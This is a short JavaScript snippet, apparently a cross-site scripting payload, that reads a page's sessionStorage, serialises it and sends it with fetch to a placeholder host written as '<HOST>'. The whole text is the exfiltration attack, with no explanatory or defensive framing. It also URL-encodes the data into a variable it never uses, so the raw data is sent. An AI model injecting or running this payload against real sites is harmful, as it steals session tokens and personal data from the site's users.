let data = JSON.stringify(sessionStorage)

let encodedData = encodeURIComponent(data)

fetch("http://<HOST>/?data=" + data)
